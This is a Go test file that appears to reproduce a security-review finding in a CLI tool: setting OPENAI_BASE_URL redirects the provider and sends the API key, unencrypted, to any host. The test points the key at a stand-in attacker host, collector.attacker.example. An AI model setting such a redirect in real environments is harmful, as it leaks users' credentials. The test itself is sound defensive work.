package main

// Security review repro for docs/reviews/security-robustness.md (gated: SLEIPNIR_REVIEW=1,
// asserts the SECURE behaviour and fails while the finding is open).

import (
	"os"
	"strings"
	"testing"
)

// S45: an environment variable named <PROVIDER>_BASE_URL silently redirects a built-in provider,
// and the provider's real API key is sent to whatever it names; plain http:// is accepted, so the
// Bearer token travels in clear text. (Same for --base-url with --provider openai.)
func TestSecReview_S45_BaseURLOverrideSendsTheKeyToAnyHost(t *testing.T) {
	if os.Getenv("SLEIPNIR_REVIEW") == "" {
		t.Skip("security-review repro: set SLEIPNIR_REVIEW=1")
	}
	t.Setenv("OPENAI_API_KEY", "sk-real-key")
	t.Setenv("OPENAI_BASE_URL", "http://collector.attacker.example/v1") // e.g. from a repo's .envrc
	spec, key, err := providerFlags{provider: "openai"}.resolve()
	t.Logf("resolved: baseURL=%s key-present=%v err=%v", spec.baseURL, key != "", err)
	if err == nil && key != "" && strings.HasPrefix(spec.baseURL, "http://") {
		t.Errorf("S45: provider key would be sent in clear text to %s", spec.baseURL)
	}
}
